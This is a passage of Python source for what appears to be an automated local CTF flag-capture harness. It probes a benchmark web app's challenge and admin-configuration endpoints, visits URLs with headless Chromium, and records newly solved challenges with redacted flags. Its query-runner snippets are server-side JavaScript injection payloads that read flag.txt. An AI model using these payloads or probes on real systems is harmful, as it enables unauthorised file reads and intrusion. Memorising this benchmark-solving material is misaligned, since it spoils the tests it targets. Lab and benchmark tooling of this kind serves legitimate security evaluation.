        result: list[tuple[str, str]] = []
        for account, phrase in pairs:
            key = (account, phrase)
            if key in seen:
                continue
            seen.add(key)
            result.append(key)
        return result

    def _ctf_target_words(self, target) -> list[str]:
        values = [str(target.handle or ""), str(target.metadata.get("ctf_lab_id", ""))]
        words: list[str] = []
        for value in values:
            for word in re.split(r"[^A-Za-z0-9]+", value.lower()):
                if 3 <= len(word) <= 24:
                    words.append(word)
        return self._dedupe_text_values(words)

    def _ctf_metadata_string_list(self, metadata: dict[str, object], key: str) -> list[str]:
        values = metadata.get(key, [])
        if not isinstance(values, list):
            return []
        return [str(item).strip() for item in values if isinstance(item, str) and str(item).strip()]

    def _ctf_query_runner_snippets(self) -> list[str]:
        return [
            "try { console.log(require('fs').readFileSync('flag.txt', 'utf8')); } catch (e) { console.log('probe'); }",
            "try { console.log(require('fs').readFileSync('./flag.txt', 'utf8')); } catch (e) { console.log('probe'); }",
            "console.log('probe');",
        ]

    def _ctf_strip_query_runner_runtime(self, interactions: list[dict[str, object]]) -> list[dict[str, object]]:
        for item in interactions:
            item.pop("opener", None)
        return interactions

    def _ctf_strip_transient_probe_fields(self, probes: list[dict[str, object]]) -> None:
        for probe in probes:
            for key in list(probe):
                if key.startswith("_"):
                    probe.pop(key, None)

    def _dedupe_text_values(self, values: list[str]) -> list[str]:
        seen: set[str] = set()
        result: list[str] = []
        for value in values:
            text = str(value).strip().lower()
            if not text or text in seen:
                continue
            seen.add(text)
            result.append(text)
        return result

    def _ctf_browser_interactions(self, target) -> list[dict[str, object]]:
        interactions: list[dict[str, object]] = []
        for base in self._ctf_capture_base_urls(target):
            before = self._ctf_challenge_state(base)
            for url in self._ctf_browser_urls(base, target.metadata):
                interaction = self._ctf_browser_interaction(url)
                after = self._ctf_challenge_state(base)
                solved = self._newly_solved_challenges(before, after)
                if solved:
                    digest = hashlib.sha256(json.dumps(solved, sort_keys=True).encode("utf-8")).hexdigest()
                    interaction.update(
                        {
                            "benchmark_solve_ref": f"evidence:benchmark-solve:{digest[:16]}",
                            "benchmark_solved_count": len(solved),
                            "benchmark_solved_challenges": solved,
                        }
                    )
                interactions.append(interaction)
                before = after
        return interactions

    def _ctf_browser_urls(self, base: str, metadata: dict[str, object]) -> list[str]:
        values: list[str] = []
        for value in metadata.get("ctf_browser_paths", []):
            if isinstance(value, str):
                values.append(value)
        config = self._ctf_public_config(base)
        application = config.get("application", {}) if isinstance(config, dict) else {}
        security_txt = config.get("securityTxt", {}) if isinstance(config, dict) else {}
        if not security_txt and isinstance(application, dict):
            security_txt = application.get("securityTxt", {})
        acknowledgement = security_txt.get("acknowledgements") if isinstance(security_txt, dict) else ""
        if isinstance(acknowledgement, str):
            values.append(acknowledgement)
        urls: list[str] = []
        for value in values:
            text = value.strip()
            if not text:
                continue
            if text.startswith("#"):
                text = "/" + text
            url = parse.urljoin(base, text.lstrip("/") if text.startswith("/") and not text.startswith("/#") else text)
            parsed = parse.urlsplit(url)
            if parsed.scheme in {"http", "https"} and self._is_allowed_ctf_http_host(
                parsed.hostname or "",
                allow_private=self._ctf_allow_private_http_metadata(metadata),
            ):
                urls.append(url)
        return self._dedupe_preserving_fragment(urls)[:4]

    def _ctf_public_config(self, base: str) -> dict[str, object]:
        url = parse.urljoin(base, "rest/admin/application-configuration")
        try:
            with request.urlopen(request.Request(url, headers={"User-Agent": "Primordial/0.1"}), timeout=5) as response:
                payload = json.loads(response.read(262144).decode("utf-8", "replace"))
        except (OSError, ValueError, error.URLError):
            return {}
        config = payload.get("config", {}) if isinstance(payload, dict) else {}
        return config if isinstance(config, dict) else {}

    def _ctf_challenge_state(self, base: str) -> dict[str, dict[str, object]]:
        url = parse.urljoin(base, "api/Challenges")
        try:
            with request.urlopen(request.Request(url, headers={"User-Agent": "Primordial/0.1"}), timeout=5) as response:
                payload = json.loads(response.read(524288).decode("utf-8", "replace"))
        except (OSError, ValueError, error.URLError):
            return {}
        rows = payload.get("data", []) if isinstance(payload, dict) else []
        state: dict[str, dict[str, object]] = {}
        for item in rows:
            if not isinstance(item, dict):
                continue
            key = str(item.get("key") or item.get("name") or "").strip()
            if not key:
                continue
            state[key] = {
                "key": key,
                "name": str(item.get("name") or key),
                "category": str(item.get("category") or ""),
                "difficulty": item.get("difficulty"),
                "solved": bool(item.get("solved")),
            }
        return state

    def _ctf_browser_interaction(self, url: str) -> dict[str, object]:
        browser = shutil.which("chromium") or shutil.which("chromium-browser") or shutil.which("google-chrome")
        if not browser:
            return {"url": self._sanitize_surface_url(url), "browser_available": False}
        command = (
            browser,
            "--headless",
            "--disable-gpu",
            "--no-sandbox",
            "--virtual-time-budget=8000",
            "--dump-dom",
            url,
        )
        try:
            completed = subprocess.run(command, check=False, capture_output=True, text=True, timeout=20)
        except (OSError, subprocess.SubprocessError) as exc:
            return {"url": self._sanitize_surface_url(url), "browser_available": True, "error": type(exc).__name__}
        flag = self._ctf_capture_redacted_flag((completed.stdout or "").encode("utf-8", "replace"))
        return {
            "url": self._sanitize_surface_url(url),
            "browser_available": True,
            "returncode": completed.returncode,
            "dom_sha256": hashlib.sha256((completed.stdout or "").encode("utf-8")).hexdigest(),
            "dom_bytes": len((completed.stdout or "").encode("utf-8")),
            **flag,
        }

    def _newly_solved_challenges(
        self,
        before: dict[str, dict[str, object]],
        after: dict[str, dict[str, object]],
    ) -> list[dict[str, object]]:
        solved: list[dict[str, object]] = []
        for key, item in after.items():
            if item.get("solved") is not True:
                continue
            if before.get(key, {}).get("solved") is True:
                continue
            solved.append(
                {
                    "key": key,
                    "name": item.get("name", key),
                    "category": item.get("category", ""),
                    "difficulty": item.get("difficulty"),
                }
            )
        return sorted(solved, key=lambda item: str(item["key"]))

    def _dedupe_preserving_fragment(self, values: list[str]) -> list[str]:
        urls: list[str] = []
        seen: set[str] = set()
        for value in values:
            if value in seen:
                continue
            seen.add(value)
            urls.append(value)
        return urls

    def _ctf_capture_summary(self, handle: str, payload: dict[str, object]) -> str:
        if payload["captured_flag_ref"]:
            return f"Closed-book local CTF flag capture found a redacted flag ref for {handle}."
        if payload["benchmark_solve_ref"]:
            return f"Closed-book local CTF browser interaction solved {payload['benchmark_solved_count']} benchmark challenge(s) for {handle}."
        return (
            "Closed-book local CTF flag capture searched "
            f"{payload['searched_url_count']} URL(s), ran {payload['kubernetes_probe_count']} Kubernetes probe(s), "
            f"ran {payload['cloud_probe_count']} cloud probe(s), "
            f"ran {payload['benchmark_api_probe_count']} benchmark API probe(s), "
            f"and ran {payload['browser_interaction_count']} browser interaction(s) "
            f"for {handle} without finding a flag or benchmark solve."
        )

    def _ctf_capture_note(self, payload: dict[str, object]) -> str:
        lines = [
            "Mode: closed-book local CTF flag capture.",
            f"Candidate URLs: {payload['candidate_count']}",
            f"Searched URLs: {payload['searched_url_count']}",
            f"Kubernetes probes: {payload['kubernetes_probe_count']}",
            f"Cloud probes: {payload['cloud_probe_count']}",
            f"Benchmark API probes: {payload['benchmark_api_probe_count']}",
            f"Browser interactions: {payload['browser_interaction_count']}",
        ]
        if payload["captured_flag_ref"]:
            lines.extend(
                [
                    f"Captured flag ref: {payload['captured_flag_ref']}",
                    f"Flag SHA-256: {payload['captured_flag_sha256']}",
                    f"Flag length: {payload['captured_flag_length']}",
                    f"Source URL: {payload['source_url']}",
                ]
            )
        elif payload["benchmark_solve_ref"]:
            lines.extend(
                [
                    f"Benchmark solve ref: {payload['benchmark_solve_ref']}",
                    f"Benchmark solved count: {payload['benchmark_solved_count']}",
                ]
            )
            for item in payload["benchmark_solved_challenges"]:
                lines.append(f"- {item['name']} ({item['key']})")
        else:
            lines.append("No flag or benchmark solve was observed in the bounded local search.")
        lines.append("Raw flag values are intentionally omitted.")
        return "\n".join(lines)
